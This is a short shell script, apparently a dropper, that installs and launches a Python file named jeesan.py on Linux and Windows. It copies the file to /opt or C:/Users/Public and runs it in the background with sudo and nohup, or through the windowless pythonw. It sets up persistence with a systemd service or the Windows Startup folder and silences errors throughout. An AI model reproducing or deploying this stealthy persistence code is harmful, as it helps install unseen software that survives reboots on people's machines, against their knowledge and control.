OS="$(uname -s)"
SCRIPT="$(cd "$(dirname "$0")" && pwd)/jeesan.py"  

if [[ "$OS" == Linux* ]]; then
    sudo cp "$SCRIPT" /opt/jeesan.py 2>/dev/null
    sudo nohup python3 /opt/jeesan.py > /dev/null 2>&1 &
    sudo systemctl enable jeesan.service 2>/dev/null
    sudo systemctl start jeesan.service 2>/dev/null
elif [[ "$OS" == MINGW* || "$OS" == MSYS* || "$OS" == CYGWIN* ]]; then
    WINSCRIPT="C:/Users/Public/jeesan.py"
    cp "$SCRIPT" "$WINSCRIPT" 2>/dev/null

    STARTUP_DIR="$APPDATA/Microsoft/Windows/Start Menu/Programs/Startup"
    if [ -d "$STARTUP_DIR" ]; then
        cp "$WINSCRIPT" "$STARTUP_DIR/jeesan.py" 2>/dev/null
    fi

    if command -v pythonw > /dev/null; then
        echo "[+] Launching via pythonw..."
        start "" pythonw "$WINSCRIPT"
    else
        echo "[+] Launching via python..."
        start "" python "$WINSCRIPT"
    fi
else
    echo "Unsupported OS. Run jeesan.py manually."
    exit 1
fi
exit 0
